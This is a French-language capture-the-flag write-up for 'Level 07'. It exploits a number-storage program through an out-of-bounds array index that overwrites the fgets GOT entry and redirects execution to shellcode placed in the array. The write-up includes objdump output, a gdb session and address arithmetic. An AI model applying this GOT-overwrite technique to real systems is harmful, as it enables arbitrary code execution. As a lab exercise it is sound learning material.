# Level 07
<a href="/level08"><img align='right' width=20x height=auto src="https://cdn.onlinewebfonts.com/svg/img_68680.png"></img></a>

- On peut ecrire partout dans la memoire avec store sauf tout les 3 itterations
- Il suffit donc d'ecrire par dessus fgets, l'addresse vers la quelle on redirige
<pre>
objdump -R ./level07 

./level07:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ff0 R\_386\_GLOB\_DAT    \_\_gmon\_start\_\_
0804a040 R\_386\_COPY        stdin@@GLIBC\_2.0
0804a060 R\_386\_COPY        stdout@@GLIBC\_2.0
0804a000 R\_386\_JUMP\_SLOT   printf@GLIBC\_2.0
0804a004 R\_386\_JUMP\_SLOT   fflush@GLIBC\_2.0
0804a008 R\_386\_JUMP\_SLOT   getchar@GLIBC\_2.0
0804a00c R\_386\_JUMP\_SLOT   fgets@GLIBC\_2.0
0804a010 R\_386\_JUMP\_SLOT   \_\_stack\_chk\_fail@GLIBC\_2.4
0804a014 R\_386\_JUMP\_SLOT   puts@GLIBC\_2.0
0804a018 R\_386\_JUMP\_SLOT   \_\_gmon\_start\_\_
0804a01c R\_386\_JUMP\_SLOT   \_\_libc\_start\_main@GLIBC\_2.0
0804a020 R\_386\_JUMP\_SLOT   memset@GLIBC\_2.0
0804a024 R\_386\_JUMP\_SLOT   \_\_isoc99\_scanf@GLIBC\_2.7
</pre>

- On ne peut pas rediriger vers l'environnement ou les argument car il sont supprimé
- Il faut donc rediriger vers le tableau sur le quelle ont ecrit
- Dans le ltrace il n'y a pas l'addresse de l'index 1 du tableau
- Pour la connaitre il suffit donc de connaitre la difference entre le retour de fgets et l'index 1 du tableau puis de faire le calcul
- Dans gdb on print donc ces deux addresses
<pre>
(gdb) b *0x08048887
Breakpoint 1 at 0x8048887
(gdb) b *0x80486cb
Breakpoint 2 at 0x80486cb
(gdb) r
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store

Breakpoint 1, 0x08048887 in main ()
(gdb) x $eax
0xffffd5e8:     0x726f7473  # retou de fgets
(gdb) c
Continuing.
 Number: 123
 Index: 1

Breakpoint 2, 0x080486cb in store_number ()
(gdb) x $eax
0xffffd458:     0x00000000 # index 1 du tableau

Input command: store
 Number: 1
 Index: -2

Breakpoint 2, 0x080486cb in store_number ()
(gdb) x $eax
0xffffd44c:     0xffffd6b8 # index -2 du tableau
</pre>
- On peut faire nos calcul de difference:
 - pour 1: 0xffffd5e8 - 0xffffd458 = 0x190 = 400
 - pour -2: 0xffffd5e8 - 0xffffd44c = 0x19c = 412
- Se qui donne:
 - L'adresse de -1 est: 0xffffd608 - 0x190 = 0xffffd478
 - L'index de l'addresse de fgets est: ((0x0804a00c - (0xffffd608 - 0x19c)) / 4) - 2 = -1040108826
- Apres j'ai créé un programme qui modifie un shellcode en lui ajouter des jump se qui le permet de sauté les index ou je ne peut pas ecrire
- Puis qui le converti en entrée pour le programme
- Et voila il suffit apres cela de mettre l'entrée dans l'executable
